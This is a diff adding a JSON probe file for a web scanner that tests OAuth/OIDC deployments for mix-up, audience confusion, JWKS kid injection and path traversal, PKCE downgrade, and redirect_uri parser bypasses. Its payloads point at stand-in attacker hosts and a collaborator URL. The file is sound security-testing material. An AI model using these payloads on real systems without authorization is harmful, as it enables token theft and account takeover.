@@ -1,0 +1,140 @@
+{
+  "category": "oauth_chain_attacks",
+  "description": "OAuth 2.0 / OIDC chain attacks beyond the base oauth.json: mix-up (RFC 6749 §10.10), audience confusion, JWKS swap via kid header injection, PKCE downgrade, redirect_uri parser quirks. References: PortSwigger OAuth labs, draft-ietf-oauth-security-topics.",
+  "contexts": {
+    "oauth_mixup_attack": {
+      "description": "Mix-up: attacker tricks client into sending code/token to attacker AS, then attacker forwards to legitimate AS. Detected via iss parameter mismatch or absent iss in token response.",
+      "tech_match": ["oauth", "oidc"],
+      "param_match": ["state", "iss", "client_id", "code", "redirect_uri"],
+      "probes": [
+        {
+          "payload": "?iss=https://attacker.example.com",
+          "description": "Send token request with iss claim pointing at attacker AS. Vulnerable client doesn't validate iss against the AS metadata it used.",
+          "matchers": [
+            {"type": "status", "status": [200, 302], "condition": "or"},
+            {"type": "word", "words": ["access_token", "id_token"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "oauth_audience_confusion": {
+      "description": "Send token issued for Audience A to Resource Server B. Vulnerable RS doesn't validate aud claim and accepts any signed token from the same IdP.",
+      "tech_match": ["oauth", "oidc", "jwt"],
+      "param_match": ["access_token", "id_token", "Authorization"],
+      "probes": [
+        {
+          "payload": "Authorization: Bearer <token-with-aud=another-service>",
+          "description": "Use a token minted for a different audience. Operator captures victim token from a sister app, replays here.",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"},
+            {"type": "not_word", "words": ["invalid audience", "aud claim", "unauthorized"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "jwks_kid_swap": {
+      "description": "JWT signature verification via JWKS — kid header tells verifier which key to use. If verifier fetches JWKS from URL in kid, attacker hosts own JWKS with matching kid.",
+      "tech_match": ["jwt", "oidc", "oauth"],
+      "param_match": ["Authorization", "id_token"],
+      "probes": [
+        {
+          "payload": "Bearer <jwt with kid=https://COLLABORATOR/.well-known/jwks.json>",
+          "description": "Kid header injection — verifier fetches JWKS from attacker URL",
+          "matchers": [
+            {"type": "collaborator", "weight": 100},
+            {"type": "status", "status": [200], "condition": "and"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {"collaborator": "{{collaborator}}"}
+        },
+        {
+          "payload": "Bearer <jwt with kid='../../../jwks.json'>",
+          "description": "Kid path-traversal — read alternative JWKS from disk / unintended endpoint",
+          "matchers": [
+            {"type": "status", "status": [200], "condition": "and"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "pkce_downgrade": {
+      "description": "PKCE downgrade — request /authorize without code_challenge. Vulnerable AS issues code anyway. Then exchange without code_verifier.",
+      "tech_match": ["oauth", "oidc", "pkce"],
+      "param_match": ["code_challenge", "code_challenge_method", "code_verifier"],
+      "probes": [
+        {
+          "payload": "?response_type=code&client_id=public-client&redirect_uri=...&state=x",
+          "description": "Authorize-without-PKCE — vulnerable AS issues code that can be exchanged without verifier",
+          "matchers": [
+            {"type": "status", "status": [302], "condition": "and"},
+            {"type": "header", "header": "location", "weight": 80},
+            {"type": "regex", "pattern": "\\?code=[A-Za-z0-9_-]+", "weight": 80}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "redirect_uri_parser_quirks": {
+      "description": "redirect_uri parser bypass — fragment, userinfo, path-segment confusion, fake-port, urlencoded path. Many AS implementations are looser than RFC requires.",
+      "tech_match": ["oauth", "oidc"],
+      "param_match": ["redirect_uri"],
+      "probes": [
+        {
+          "payload": "?redirect_uri=https://legit.example.com@attacker.tld/",
+          "description": "Userinfo trick — many parsers see authority=legit.example.com but actual host=attacker.tld",
+          "matchers": [
+            {"type": "status", "status": [302], "condition": "and"},
+            {"type": "header", "header": "location", "weight": 80}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "?redirect_uri=https://legit.example.com.attacker.tld/",
+          "description": "Substring-match bypass — redirect_uri startsWith / contains check",
+          "matchers": [
+            {"type": "status", "status": [302], "condition": "and"},
+            {"type": "header", "header": "location", "weight": 80}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "?redirect_uri=https://legit.example.com/cb#@attacker.tld/",
+          "description": "Fragment-confusion — parser splits at # but UA sends whole string",
+          "matchers": [
+            {"type": "status", "status": [302], "condition": "and"},
+            {"type": "header", "header": "location", "weight": 80}
+          ],
+          "severity": "medium",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "?redirect_uri=https://legit.example.com%2F.attacker.tld%2F",
+          "description": "Double-decode bypass — server decodes %2F twice, attacker tail wins",
+          "matchers": [
+            {"type": "status", "status": [302], "condition": "and"},
+            {"type": "header", "header": "location", "weight": 80}
+          ],
+          "severity": "medium",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
